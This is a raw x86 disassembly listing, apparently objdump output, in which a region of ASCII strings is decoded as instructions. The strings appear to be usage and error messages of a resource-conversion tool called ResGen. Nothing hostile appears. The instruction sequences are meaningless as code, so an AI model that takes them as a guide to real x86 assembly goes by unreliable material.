  4047b1:	and    BYTE PTR [edx],ah
  4047b3:	jnp    0x4047e5
  4047b5:	jge    0x4047d9
  4047b7:	add    DWORD PTR cs:[esi+0x46],ebx
  4047bb:	outs   dx,DWORD PTR ds:[esi]
  4047bc:	jne    0x40482c
  4047be:	and    BYTE PTR fs:[ecx+0x6e],ah
  4047c2:	and    BYTE PTR [ebp+0x71],ah
  4047c5:	jne    0x404828
  4047c7:	ins    BYTE PTR es:[edi],dx
  4047c8:	jae    0x4047ea
  4047ca:	jae    0x404835
  4047cc:	outs   dx,BYTE PTR ds:[si]
  4047ce:	and    BYTE PTR [ecx+0x74],ah
  4047d1:	and    BYTE PTR [edx+0x65],ah
  4047d4:	imul   ebp,DWORD PTR [bp+0x6e],0x20676e69
  4047dc:	outs   dx,DWORD PTR ds:[esi]
  4047dd:	data16 and BYTE PTR [ecx+0x20],ah
  4047e1:	ins    BYTE PTR es:[edi],dx
  4047e2:	imul   ebp,DWORD PTR [esi+0x65],0x45202021
  4047e9:	js     0x40485b
  4047eb:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  4047f0:	and    BYTE PTR [ecx+0x20],ah
  4047f3:	outs   dx,BYTE PTR ds:[esi]
  4047f4:	popa   
  4047f5:	ins    DWORD PTR es:[edi],dx
  4047f6:	and    BYTE PTR gs:[edi],ch
  4047f9:	and    BYTE PTR [esi+0x61],dh
  4047fc:	ins    BYTE PTR es:[edi],dx
  4047fd:	jne    0x404864
  4047ff:	and    BYTE PTR [eax+0x61],dh
  404802:	imul   esi,DWORD PTR [edx+0x20],0x656b696c
  404809:	and    BYTE PTR [edi],ah
  40480b:	outs   dx,BYTE PTR ds:[esi]
  40480c:	popa   
  40480d:	ins    DWORD PTR es:[edi],dx
  40480e:	and    BYTE PTR gs:0x6c617620,bh
  404815:	jne    0x40487c
  404817:	daa    
  404818:	add    DWORD PTR [edi+0x46],ebp
  40481b:	outs   dx,DWORD PTR ds:[esi]
  40481c:	jne    0x40488c
  40481e:	and    BYTE PTR fs:[ecx+0x20],ah
  404822:	jb     0x404889
  404824:	jae    0x404895
  404826:	jne    0x40489a
  404828:	arpl   WORD PTR [ebp+0x20],sp
  40482b:	je     0x404895
  40482d:	popa   
  40482e:	je     0x404850
  404830:	push   0x61206461
  404835:	and    BYTE PTR [esi+0x65],ch
  404838:	ja     0x40485a
  40483a:	ins    BYTE PTR es:[edi],dx
  40483b:	imul   ebp,DWORD PTR [esi+0x65],0x206e6920
  404842:	imul   esi,DWORD PTR [esp+ebp*1+0x20],0x20747562
  40484a:	arpl   WORD PTR [edi+0x75],bp
  40484d:	ins    BYTE PTR es:[edi],dx
  40484e:	outs   dx,BYTE PTR fs:[esi]
  404850:	daa    
  404851:	je     0x404873
  404853:	imul   bp,WORD PTR [esi+0x64],0x7420
  404859:	push   0x71652065
  40485e:	jne    0x4048c1
  404860:	ins    BYTE PTR es:[edi],dx
  404861:	and    BYTE PTR [ebx+0x69],dh
  404864:	outs   dx,BYTE PTR ds:[si]
  404866:	and    BYTE PTR [edi+0x69],dh
  404869:	je     0x4048d3
  40486b:	imul   ebp,DWORD PTR [esi+0x21],0x654c2020
  404872:	outs   dx,BYTE PTR ds:[esi]
  404873:	addr16 je 0x4048de
  404876:	cmp    ah,BYTE PTR [eax]
  404878:	jnp    0x4048aa
  40487a:	jge    0x40489c
  40487c:	and    BYTE PTR [esi+0x61],ch
  40487f:	ins    DWORD PTR es:[edi],dx
  404880:	cmp    ah,BYTE PTR gs:[eax]
  404883:	daa    
  404884:	jnp    0x4048b7
  404886:	jge    0x4048af
  404888:	add    DWORD PTR cs:[ecx+0x4d],edx
  40488c:	imul   esi,DWORD PTR [ebx+0x73],0x20676e69
  404893:	jbe    0x4048f6
  404895:	ins    BYTE PTR es:[edi],dx
  404896:	jne    0x4048fd
  404898:	and    DWORD PTR [eax],esp
  40489a:	and    BYTE PTR [ebp+0x78],al
  40489d:	jo     0x404904
  40489f:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  4048a3:	and    BYTE PTR [ecx+0x20],ah
  4048a6:	outs   dx,BYTE PTR ds:[esi]
  4048a7:	popa   
  4048a8:	ins    DWORD PTR es:[edi],dx
  4048a9:	and    BYTE PTR gs:[edi],ch
  4048ac:	and    BYTE PTR [esi+0x61],dh
  4048af:	ins    BYTE PTR es:[edi],dx
  4048b0:	jne    0x404917
  4048b2:	and    BYTE PTR [eax+0x61],dh
  4048b5:	imul   esi,DWORD PTR [edx+0x20],0x656b696c
  4048bc:	and    BYTE PTR [edi],ah
  4048be:	outs   dx,BYTE PTR ds:[esi]
  4048bf:	popa   
  4048c0:	ins    DWORD PTR es:[edi],dx
  4048c1:	and    BYTE PTR gs:0x6c617620,bh
  4048c8:	jne    0x40492f
  4048ca:	daa    
  4048cb:	and    BYTE PTR cs:[eax],ah
  4048ce:	dec    esi
  4048cf:	popa   
  4048d0:	ins    DWORD PTR es:[edi],dx
  4048d1:	and    BYTE PTR gs:[edi+0x61],dh
  4048d5:	jae    0x4048f7
  4048d7:	and    bh,BYTE PTR [ebx+0x30]
  4048da:	jge    0x4048fe
  4048dc:	add    DWORD PTR [ecx+0x4f],ecx
  4048df:	outs   dx,BYTE PTR ds:[esi]
  4048e0:	ins    BYTE PTR es:[edi],dx
  4048e1:	jns    0x404903
  4048e3:	jae    0x404959
  4048e5:	jb     0x404950
  4048e7:	outs   dx,BYTE PTR ds:[esi]
  4048e8:	addr16 jae 0x40490b
  4048eb:	arpl   WORD PTR [ecx+0x6e],sp
  4048ee:	and    BYTE PTR [edx+0x65],ah
  4048f1:	and    BYTE PTR [edi+0x72],dh
  4048f4:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x6f74206e
  4048fc:	and    BYTE PTR [ecx+0x20],ah
  4048ff:	cs je  0x40497a
  404902:	je     0x404924
  404904:	imul   bp,WORD PTR [ebp+eiz*2+0x3b],0x7420
  40490b:	push   0x61762065
  404910:	ins    BYTE PTR es:[edi],dx
  404911:	jne    0x404978
  404913:	and    BYTE PTR [edi+0x66],ch
  404916:	and    BYTE PTR [edi],ah
  404918:	jnp    0x40494a
  40491a:	jge    0x404943
  40491c:	and    BYTE PTR [ecx+0x73],ch
  40491f:	and    BYTE PTR [ecx+0x20],ah
  404922:	daa    
  404923:	jnp    0x404956
  404925:	jge    0x40494e
  404927:	add    DWORD PTR [eax],esp
  404929:	push   edx
  40492a:	gs popa 
  40492c:	and    BYTE PTR fs:[ecx+0x6e],ch
  404930:	and    BYTE PTR [ebx+0x30],bh
  404933:	jge    0x404955
  404935:	jb     0x40499c
  404937:	jae    0x4049a8
  404939:	jne    0x4049ad
  40493b:	arpl   WORD PTR [ebp+0x73],sp
  40493e:	and    BYTE PTR [esi+0x72],ah
  404941:	outs   dx,DWORD PTR ds:[esi]
  404942:	ins    DWORD PTR es:[edi],dx
  404943:	and    BYTE PTR [edx],ah
  404945:	jnp    0x404978
  404947:	jge    0x40496b
  404949:	add    DWORD PTR [ecx],ebp
  40494b:	push   ebx
  40494c:	jo     0x4049b3
  40494e:	arpl   WORD PTR [ecx+0x66],bp
  404951:	imul   esp,DWORD PTR [ebx+0x20],0x65637865
  404958:	jo     0x4049ce
  40495a:	imul   ebp,DWORD PTR [edi+0x6e],0x7b22203a
  404961:	xor    BYTE PTR [ebp+0x22],bh
  404964:	and    BYTE PTR [eax],ah
  404966:	dec    ebp
  404967:	gs jae 0x4049dd
  40496a:	popa   
  40496b:	cmp    ah,BYTE PTR gs:[bx+si]
  40496f:	and    bh,BYTE PTR [ebx+0x31]
  404972:	jge    0x404996
  404974:	add    DWORD PTR [ecx+0x54],edx
  404977:	push   0x5b222065
  40497c:	jae    0x4049f2
  40497e:	jb     0x4049e9
  404980:	outs   dx,BYTE PTR ds:[esi]
  404981:	addr16 jae 0x4049e1
  404984:	and    ah,BYTE PTR [eax]
  404986:	je     0x4049e9
  404988:	and    BYTE PTR [bx+di+0x73],ch
  40498c:	and    BYTE PTR [esi+0x6f],ch
  40498f:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  404993:	addr16 gs jb 0x4049b7
  404997:	outs   dx,BYTE PTR ds:[esi]
  404998:	arpl   WORD PTR gs:[ebp+0x73],sp
  40499c:	jae    0x4049ff
  40499e:	jb     0x404a19
  4049a0:	and    BYTE PTR [ecx+0x6e],ch
  4049a3:	and    BYTE PTR [ecx+0x6f],bh
  4049a6:	jne    0x404a1a
  4049a8:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  4049ac:	je     0x4049ce
  4049ae:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x202e
  4049b5:	and    BYTE PTR [eax+0x6c],dl
  4049b8:	gs popa 
  4049ba:	jae    0x404a21
  4049bc:	and    BYTE PTR [edx+0x65],dh
  4049bf:	ins    DWORD PTR es:[edi],dx
  4049c0:	outs   dx,DWORD PTR ds:[esi]
  4049c1:	jbe    0x404a28
  4049c3:	and    BYTE PTR [ecx+0x74],ch
  4049c6:	add    DWORD PTR cs:[ebx],ebp
  4049c9:	push   ebp
  4049ca:	outs   dx,BYTE PTR ds:[esi]
  4049cb:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4049cf:	outs   dx,BYTE PTR ds:[esi]
  4049d0:	and    BYTE PTR [esi+0x69],ah
  4049d3:	ins    BYTE PTR es:[edi],dx
  4049d4:	and    BYTE PTR gs:[ebp+0x78],ah
  4049d8:	je     0x404a3f
  4049da:	outs   dx,BYTE PTR ds:[esi]
  4049db:	jae    0x404a46
  4049dd:	outs   dx,DWORD PTR ds:[esi]
  4049de:	outs   dx,BYTE PTR ds:[esi]
  4049df:	and    BYTE PTR [edx],ah
  4049e1:	jnp    0x404a13
  4049e3:	jge    0x404a07
  4049e5:	and    BYTE PTR [esi+0x6f],ah
  4049e8:	jb     0x404a0a
  4049ea:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x7b22
  4049f1:	xor    DWORD PTR [ebp+0x22],edi
  4049f4:	add    DWORD PTR [ebp+0x43],ebx
  4049f7:	outs   dx,DWORD PTR ds:[esi]
  4049f8:	jne    0x404a66
  4049fa:	and    BYTE PTR fs:[esi+0x6f],ch
  4049fe:	je     0x404a20
  404a00:	arpl   WORD PTR [edx+0x65],si
  404a03:	popa   
  404a04:	je     0x404a6b
  404a06:	and    BYTE PTR [ecx+0x20],ah
  404a09:	jo     0x404a7d
  404a0b:	outs   dx,DWORD PTR ds:[esi]
  404a0c:	jo     0x404a73
  404a0e:	jb     0x404a84
  404a10:	jns    0x404a32
  404a12:	outs   dx,DWORD PTR ds:[esi]
  404a13:	outs   dx,BYTE PTR ds:[esi]
  404a14:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404a18:	and    BYTE PTR [ebx+0x74],dh
  404a1b:	jb     0x404a8c
  404a1d:	outs   dx,BYTE PTR ds:[esi]
  404a1e:	ins    BYTE PTR es:[di],dx
  404a20:	jns    0x404a42
  404a22:	je     0x404a9d
  404a24:	jo     0x404a8b
  404a26:	and    BYTE PTR fs:[edx+0x65],dh
  404a2a:	jae    0x404a9b
  404a2c:	jne    0x404aa0
  404a2e:	arpl   WORD PTR [ebp+0x20],sp
  404a31:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404a35:	jae    0x404a57
  404a37:	outs   dx,WORD PTR ds:[esi]
  404a39:	jb     0x404a5b
  404a3b:	je     0x404aa5
  404a3d:	and    BYTE PTR gs:[edx+0x65],dh
  404a41:	jae    0x404ab2
  404a43:	jne    0x404ab7
  404a45:	arpl   WORD PTR [ebp+0x20],sp
  404a48:	outs   dx,BYTE PTR ds:[esi]
  404a49:	popa   
  404a4a:	ins    DWORD PTR es:[edi],dx
  404a4b:	and    BYTE PTR gs:[edx],ah
  404a4e:	jnp    0x404a80
  404a50:	jge    0x404a74
  404a52:	add    DWORD PTR cs:[ebx+0x63694d0e],esp
  404a59:	jb     0x404aca
  404a5b:	jae    0x404acc
  404a5d:	data16 je 0x404a80
  404a60:	sub    BYTE PTR [edx+0x29],dl
  404a63:	and    BYTE PTR [esi],ch
  404a65:	dec    esi
  404a66:	inc    ebp
  404a67:	push   esp
  404a68:	and    BYTE PTR [edx+0x65],dl
  404a6b:	jae    0x404adc
  404a6d:	jne    0x404ae1
  404a6f:	arpl   WORD PTR [ebp+0x20],sp
  404a72:	inc    edi
  404a73:	outs   dx,BYTE PTR gs:[esi]
  404a75:	gs jb  0x404ad9
  404a78:	je     0x404ae9
  404a7a:	jb     0x404a9c
  404a7c:	or     eax,0x694d5b0a
  404a81:	arpl   WORD PTR [edx+0x6f],si
  404a84:	jae    0x404af5
  404a86:	data16 je 0x404aa9
  404a89:	cs dec esi
  404a8b:	gs je  0x404aae
  404a8e:	inc    esi
  404a8f:	jb     0x404af2
  404a91:	ins    DWORD PTR es:[edi],dx
  404a92:	gs ja  0x404b04
  404a95:	jb     0x404b02
  404a97:	sub    al,0x20
  404a99:	push   esi
  404a9a:	gs jb  0x404b10
  404a9d:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b20
  404aa4:	pop    ebp
  404aa5:	or     eax,0x7d317b0a
  404aaa:	or     eax,0x550a0d0a
  404aaf:	jae    0x404b12
  404ab1:	cmp    cl,BYTE PTR gs:[di]
  404ab5:	or     ah,BYTE PTR [eax]
  404ab7:	and    BYTE PTR [eax],ah
  404ab9:	push   edx
  404aba:	gs jae 0x404b04
  404abd:	outs   dx,BYTE PTR gs:[esi]
  404abf:	and    BYTE PTR [ecx+0x6e],ch
  404ac2:	jo     0x404b39
  404ac4:	je     0x404b0c
  404ac6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x20747865
  404ace:	pop    ebx
  404acf:	outs   dx,DWORD PTR ds:[esi]
  404ad0:	jne    0x404b46
  404ad2:	jo     0x404b49
  404ad4:	je     0x404b1c
  404ad6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x5d747865
  404ade:	and    BYTE PTR [ebx+0x2f],bl
  404ae1:	jae    0x404b57
  404ae3:	jb     0x404b1f
  404ae5:	ins    BYTE PTR es:[edi],dx
  404ae6:	popa   
  404ae7:	outs   dx,BYTE PTR ds:[esi]
  404ae8:	addr16 pop ebx
  404aea:	sub    al,0x6e
  404aec:	popa   
  404aed:	ins    DWORD PTR es:[edi],dx
  404aee:	gs jae 0x404b61
  404af1:	popa   
  404af2:	arpl   WORD PTR [ebp+0x5b],sp
  404af5:	sub    al,0x63
  404af7:	ins    BYTE PTR es:[edi],dx
  404af8:	popa   
  404af9:	jae    0x404b6e
  404afb:	pop    ebx
  404afc:	sub    al,0x66
  404afe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x5d],0xd5d5d5d
  404b06:	or     ah,BYTE PTR [eax]
  404b08:	and    BYTE PTR [eax],ah
  404b0a:	push   edx
  404b0b:	gs jae 0x404b55
  404b0e:	outs   dx,BYTE PTR gs:[esi]
  404b10:	and    BYTE PTR [ebx+0x6f],bl
  404b13:	jo     0x404b89
  404b15:	imul   ebp,DWORD PTR [edi+0x6e],0x2f205d73
  404b1c:	arpl   WORD PTR [edi+0x6d],bp
  404b1f:	jo     0x404b8a
  404b21:	ins    BYTE PTR es:[edi],dx
  404b22:	and    BYTE PTR gs:[ecx+0x6e],ch
  404b26:	jo     0x404b9d
  404b28:	je     0x404b70
  404b2a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x31],0x7478652e
  404b32:	pop    ebx
  404b33:	sub    al,0x6f
  404b35:	jne    0x404bab
  404b37:	jo     0x404bae
  404b39:	je     0x404b81
  404b3b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x31],0x7365722e
  404b43:	outs   dx,DWORD PTR ds:[esi]
  404b44:	jne    0x404bb8
  404b46:	arpl   WORD PTR [ebp+0x73],sp
  404b49:	pop    ebp
  404b4a:	and    BYTE PTR [ebx+0x2e],bl
  404b4d:	cs cs pop ebp
  404b50:	or     eax,0x570a0d0a
  404b55:	push   0x20657265
  404b5a:	cs gs js 0x404bd2
  404b5e:	and    BYTE PTR [ecx+0x73],ch
  404b61:	and    BYTE PTR [esi],ch
  404b63:	jb     0x404bca
  404b65:	jae    0x404bbf
  404b67:	sub    al,0x20
  404b69:	cs jb  0x404bd1
  404b6c:	jae    0x404be2
  404b6e:	gs js  0x404be5
  404b71:	sub    al,0x20
  404b73:	cs je  0x404bee
  404b76:	je     0x404ba4
  404b78:	and    BYTE PTR [edi+0x72],ch
  404b7b:	and    BYTE PTR [esi],ch
  404b7d:	jb     0x404be4
  404b7f:	jae    0x404bf0
  404b81:	jne    0x404bf5
  404b83:	arpl   WORD PTR [ebp+0x73],sp
  404b86:	or     eax,0x430a0d0a
  404b8b:	outs   dx,DWORD PTR ds:[esi]
  404b8c:	outs   dx,BYTE PTR ds:[esi]
  404b8d:	jbe    0x404bf4
  404b8f:	jb     0x404c05
  404b91:	jae    0x404bb3
  404b93:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6620
  404b9a:	jb     0x404c0b
  404b9c:	ins    DWORD PTR es:[edi],dx
  404b9d:	and    BYTE PTR [edi+0x6e],ch
  404ba0:	and    BYTE PTR gs:[edx+0x65],dh
  404ba4:	jae    0x404c15
  404ba6:	jne    0x404c1a
  404ba8:	arpl   WORD PTR [ebp+0x20],sp
  404bab:	outs   dx,WORD PTR ds:[esi]
  404bad:	jb     0x404c1c
  404baf:	popa   
  404bb0:	je     0x404bd2
  404bb2:	je     0x404c23
  404bb4:	and    BYTE PTR [ecx+0x6e],ah
  404bb7:	outs   dx,DWORD PTR ds:[esi]
  404bb8:	je     0x404c22
  404bba:	gs jb  0x404beb
  404bbd:	and    BYTE PTR [eax],ah
  404bbf:	dec    ecx
  404bc0:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  404bc5:	and    BYTE PTR [edi+0x75],ch
  404bc8:	je     0x404c3a
  404bca:	jne    0x404c40
  404bcc:	or     eax,0x6c69660a
  404bd1:	outs   dx,BYTE PTR gs:[esi]
  404bd3:	popa   
  404bd4:	ins    DWORD PTR es:[edi],dx
  404bd5:	and    BYTE PTR gs:[ecx+0x73],ch
  404bd9:	and    BYTE PTR [esi+0x6f],ch
  404bdc:	je     0x404bfe
  404bde:	jae    0x404c50
  404be0:	arpl   WORD PTR gs:[ecx+0x66],bp
  404be4:	imul   esp,DWORD PTR [ebp+0x64],0x6e69202c
  404beb:	jo     0x404c62
  404bed:	je     0x404c35
  404bef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x6f736572
  404bf7:	jne    0x404c6b
  404bf9:	arpl   WORD PTR [ebp+0x73],sp
  404bfc:	and    BYTE PTR [edi+0x69],dh
  404bff:	ins    BYTE PTR es:[edi],dx
  404c00:	ins    BYTE PTR es:[edi],dx
  404c01:	and    BYTE PTR [edx+0x65],ah
  404c04:	and    BYTE PTR [ebp+0x73],dh
  404c07:	gs fs cs or eax,0x74704f0a
  404c0f:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d3a73
  404c16:	das    
  404c17:	arpl   WORD PTR [edi+0x6d],bp
  404c1a:	jo     0x404c85
  404c1c:	ins    BYTE PTR es:[edi],dx
  404c1d:	and    BYTE PTR gs:[eax],ah
  404c20:	and    BYTE PTR [eax],ah
  404c22:	and    BYTE PTR [eax],ah
  404c24:	and    BYTE PTR [eax],ah
  404c26:	inc    ebx
  404c27:	outs   dx,DWORD PTR ds:[esi]
  404c28:	outs   dx,BYTE PTR ds:[esi]
  404c29:	jbe    0x404c90
  404c2b:	jb     0x404ca1
  404c2d:	jae    0x404c4f
  404c2f:	popa   
  404c30:	and    BYTE PTR [ecx+ebp*2+0x73],ch
  404c34:	je     0x404c56
  404c36:	outs   dx,DWORD PTR ds:[esi]
  404c37:	data16 and BYTE PTR [edx+0x65],dh
  404c3b:	jae    0x404cac
  404c3d:	jne    0x404cb1
  404c3f:	arpl   WORD PTR [ebp+0x20],sp
  404c42:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6620
  404c49:	jb     0x404cba
  404c4b:	ins    DWORD PTR es:[edi],dx
  404c4c:	and    BYTE PTR [edi+0x6e],ch
  404c4f:	and    BYTE PTR gs:[esi+0x6f],ah
  404c53:	jb     0x404cc2
  404c55:	popa   
  404c56:	je     0x404c78
  404c58:	je     0x404cc9
  404c5a:	and    BYTE PTR [ecx+0x6e],ah
  404c5d:	outs   dx,DWORD PTR ds:[esi]
  404c5e:	je     0x404cc8
  404c60:	gs jb  0x404c70
  404c63:	or     ah,BYTE PTR [eax]
  404c65:	and    BYTE PTR [eax],ah
  404c67:	and    BYTE PTR [eax],ah
  404c69:	and    BYTE PTR [eax],ah
  404c6b:	and    BYTE PTR [eax],ah
  404c6d:	and    BYTE PTR [eax],ah
  404c6f:	and    BYTE PTR [eax],ah
  404c71:	and    BYTE PTR [eax],ah
  404c73:	and    BYTE PTR [ecx+0x6e],ch
  404c76:	and    BYTE PTR [edi+0x6e],ch
  404c79:	and    BYTE PTR gs:[edx+0x75],ah
  404c7d:	ins    BYTE PTR es:[edi],dx
  404c7e:	imul   esp,DWORD PTR [eax],0x6f
  404c81:	jo     0x404ce8
  404c83:	jb     0x404ce6
  404c85:	je     0x404cf0
  404c87:	outs   dx,DWORD PTR ds:[esi]
  404c88:	outs   dx,BYTE PTR ds:[esi]
  404c89:	and    BYTE PTR cs:[eax],ah
  404c8c:	inc    edx
  404c8d:	jns    0x404caf
  404c8f:	fs gs popaw 
  404c93:	jne    0x404d01
  404c95:	je     0x404cc3
  404c97:	and    BYTE PTR [ecx+0x74],ch
  404c9a:	and    BYTE PTR [ebx+0x6f],ah
  404c9d:	outs   dx,BYTE PTR ds:[esi]
  404c9e:	jbe    0x404d05
  404ca0:	jb     0x404d16
  404ca2:	jae    0x404cc4
  404ca4:	imul   ebp,DWORD PTR [esi+0x74],0x722e206f
  404cab:	gs jae 0x404d1d
  404cae:	jne    0x404d22
  404cb0:	arpl   WORD PTR [ebp+0x73],sp
  404cb3:	or     eax,0x2020200a
  404cb8:	and    BYTE PTR [eax],ah
  404cba:	and    BYTE PTR [eax],ah
  404cbc:	and    BYTE PTR [eax],ah
  404cbe:	and    BYTE PTR [eax],ah
  404cc0:	and    BYTE PTR [eax],ah
  404cc2:	and    BYTE PTR [eax],ah
  404cc4:	and    BYTE PTR [esi+0x69],ah
  404cc7:	ins    BYTE PTR es:[edi],dx
  404cc8:	gs jae 0x404cf7
  404ccb:	and    BYTE PTR [ebp+0x73],dh
  404cce:	imul   ebp,DWORD PTR [esi+0x67],0x706e6920
  404cd5:	jne    0x404d4b
  404cd7:	inc    esi
  404cd8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x5b],0x722e5d69
  404ce0:	gs jae 0x404d52
  404ce3:	jne    0x404d57
  404ce5:	arpl   WORD PTR [ebp+0x73],sp
  404ce8:	and    BYTE PTR [esi+0x6f],ah
  404ceb:	jb     0x404d0d
  404ced:	je     0x404d57
  404cef:	and    BYTE PTR gs:[edi+0x75],ch
  404cf3:	je     0x404d65
  404cf5:	jne    0x404d6b
  404cf7:	and    BYTE PTR [esi+0x69],ah
  404cfa:	ins    BYTE PTR es:[edi],dx
  404cfb:	and    BYTE PTR gs:[esi+0x61],ch
  404cff:	ins    DWORD PTR es:[edi],dx
  404d00:	gs cs or eax,0x74732f0a
  404d07:	jb     0x404d43
  404d09:	cmp    al,0x6c
  404d0b:	popa   
  404d0c:	outs   dx,BYTE PTR ds:[esi]
  404d0d:	addr16 jne 0x404d71
  404d10:	addr16 gs ds pop ebx
  404d14:	sub    al,0x3c
  404d16:	outs   dx,BYTE PTR ds:[esi]
  404d17:	popa   
  404d18:	ins    DWORD PTR es:[edi],dx
  404d19:	gs jae 0x404d8c
  404d1c:	popa   
  404d1d:	arpl   WORD PTR [ebp+0x3e],sp
  404d20:	pop    ebx
  404d21:	sub    al,0x3c
  404d23:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404d27:	jae    0x404d49
  404d29:	outs   dx,BYTE PTR ds:[esi]
  404d2a:	popa   
  404d2b:	ins    DWORD PTR es:[edi],dx
  404d2c:	gs ds pop ebx
  404d2f:	sub    al,0x3c
  404d31:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x616e
  404d38:	ins    DWORD PTR es:[edi],dx
  404d39:	gs ds pop ebp
  404d3c:	pop    ebp
  404d3d:	pop    ebp
  404d3e:	pop    ebp
  404d3f:	and    BYTE PTR ds:0x2020200a,cl
  404d45:	and    BYTE PTR [eax],ah
  404d47:	and    BYTE PTR [eax],ah
  404d49:	and    BYTE PTR [eax],ah
  404d4b:	and    BYTE PTR [eax],ah
  404d4d:	and    BYTE PTR [eax],ah
  404d4f:	and    BYTE PTR [eax],ah
  404d51:	and    BYTE PTR [ebx+0x72],al
  404d54:	gs popa 
  404d56:	je     0x404dbd
  404d58:	jae    0x404d7a
  404d5a:	popa   
  404d5b:	and    BYTE PTR [ebx+0x74],dh
  404d5e:	jb     0x404dcf
  404d60:	outs   dx,BYTE PTR ds:[esi]
  404d61:	ins    BYTE PTR es:[di],dx
  404d63:	jns    0x404d92
  404d65:	je     0x404de0
  404d67:	jo     0x404dce
  404d69:	and    BYTE PTR fs:[edx+0x65],dh
  404d6d:	jae    0x404dde
  404d6f:	jne    0x404de3
  404d71:	arpl   WORD PTR [ebp+0x20],sp
  404d74:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404d78:	jae    0x404d9a
  404d7a:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  404d81:	jae    0x404df3
  404d83:	arpl   WORD PTR gs:[ecx+0x66],bp
  404d87:	imul   esp,DWORD PTR [ebp+0x64],0x20200a0d
  404d8e:	and    BYTE PTR [eax],ah
  404d90:	and    BYTE PTR [eax],ah
  404d92:	and    BYTE PTR [eax],ah
  404d94:	and    BYTE PTR [eax],ah
  404d96:	and    BYTE PTR [eax],ah
  404d98:	and    BYTE PTR [eax],ah
  404d9a:	and    BYTE PTR [eax],ah
  404d9c:	jo     0x404e10
  404d9e:	outs   dx,DWORD PTR ds:[esi]
  404d9f:	addr16 jb 0x404e03
  404da2:	ins    DWORD PTR es:[edi],dx
  404da3:	ins    DWORD PTR es:[edi],dx
  404da4:	imul   ebp,DWORD PTR [esi+0x67],0x6e616c20
  404dab:	addr16 jne 0x404e0f
  404dae:	and    BYTE PTR gs:[di+0x73],dh
  404db3:	imul   ebp,DWORD PTR [esi+0x67],0x646f4320
  404dba:	gs inc esp
  404dbc:	dec    edi
  404dbd:	dec    ebp
  404dbe:	and    BYTE PTR cs:[ecx+0x6e],cl
  404dc2:	and    BYTE PTR [edi+0x72],ch
  404dc5:	fs gs jb 0x404de9
  404dc9:	outs   dx,WORD PTR ds:[esi]
  404dcb:	jb     0x404ded
  404dcd:	je     0x404e37
  404dcf:	and    BYTE PTR gs:[ebx+0x74],dh
  404dd3:	jb     0x404e44
  404dd5:	outs   dx,BYTE PTR ds:[esi]
  404dd6:	ins    BYTE PTR es:[di],dx
  404dd8:	jns    0x404de7
  404dda:	or     ah,BYTE PTR [eax]
  404ddc:	and    BYTE PTR [eax],ah
  404dde:	and    BYTE PTR [eax],ah
  404de0:	and    BYTE PTR [eax],ah
  404de2:	and    BYTE PTR [eax],ah
  404de4:	and    BYTE PTR [eax],ah
  404de6:	and    BYTE PTR [eax],ah
  404de8:	and    BYTE PTR [eax],ah
  404dea:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404dee:	gs and BYTE PTR fs:[edx+0x65],dh
  404df3:	jae    0x404e64
  404df5:	jne    0x404e69
  404df7:	arpl   WORD PTR [ebp+0x20],sp
  404dfa:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404dfe:	jae    0x404e20
  404e00:	je     0x404e71
  404e02:	and    BYTE PTR [edi+0x6f],dh
  404e05:	jb     0x404e72
  404e07:	and    BYTE PTR [eax+0x72],dh
  404e0a:	outs   dx,DWORD PTR ds:[esi]
  404e0b:	jo     0x404e72
  404e0d:	jb     0x404e7b
  404e0f:	jns    0x404e3d
  404e11:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404e15:	and    BYTE PTR [esi+0x61],ch
  404e18:	ins    DWORD PTR es:[edi],dx
  404e19:	and    BYTE PTR gs:[edi+0x66],ch
  404e1d:	and    BYTE PTR [ecx+0x6f],bh
  404e20:	jne    0x404e94
  404e22:	and    BYTE PTR [edi+0x75],ch
  404e25:	je     0x404e97
  404e27:	jne    0x404e9d
  404e29:	and    BYTE PTR ds:0x2020200a,cl
  404e2f:	and    BYTE PTR [eax],ah
  404e31:	and    BYTE PTR [eax],ah
  404e33:	and    BYTE PTR [eax],ah
  404e35:	and    BYTE PTR [eax],ah
  404e37:	and    BYTE PTR [eax],ah
  404e39:	and    BYTE PTR [eax],ah
  404e3b:	and    BYTE PTR [esi+0x69],ah
  404e3e:	ins    BYTE PTR es:[edi],dx
  404e3f:	and    BYTE PTR gs:[edi+0x69],dh
  404e43:	je     0x404ead
  404e45:	outs   dx,DWORD PTR ds:[esi]
  404e46:	jne    0x404ebc
  404e48:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404e4c:	and    BYTE PTR [esi],ch
  404e4e:	jb     0x404eb5
  404e50:	jae    0x404ec1
  404e52:	jne    0x404ec6
  404e54:	arpl   WORD PTR [ebp+0x73],sp
  404e57:	and    BYTE PTR [ebp+0x75],ch
  404e5a:	jae    0x404ed0
  404e5c:	and    BYTE PTR [ebp+0x61],ch
  404e5f:	je     0x404ec4
  404e61:	push   0x65687420
  404e66:	or     eax,0x2020200a
  404e6b:	and    BYTE PTR [eax],ah
  404e6d:	and    BYTE PTR [eax],ah
  404e6f:	and    BYTE PTR [eax],ah
  404e71:	and    BYTE PTR [eax],ah
  404e73:	and    BYTE PTR [eax],ah
